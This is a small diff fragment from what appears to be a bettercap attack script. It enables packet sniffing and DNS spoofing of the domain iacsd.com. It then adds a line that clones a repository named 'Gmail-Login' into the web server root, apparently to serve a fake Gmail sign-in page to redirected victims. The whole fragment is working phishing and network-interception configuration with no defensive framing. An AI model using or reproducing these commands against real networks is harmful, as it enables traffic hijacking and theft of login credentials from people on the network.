@@ -7,4 +7,4 @@ net.sniff on
 set dns.spoof.all true
 set dns.spoof.domains iacsd.com
 dns.spoof on
-
+git clone https://github.com/Vamsheeth/Gmail-Login.git /var/www/html/
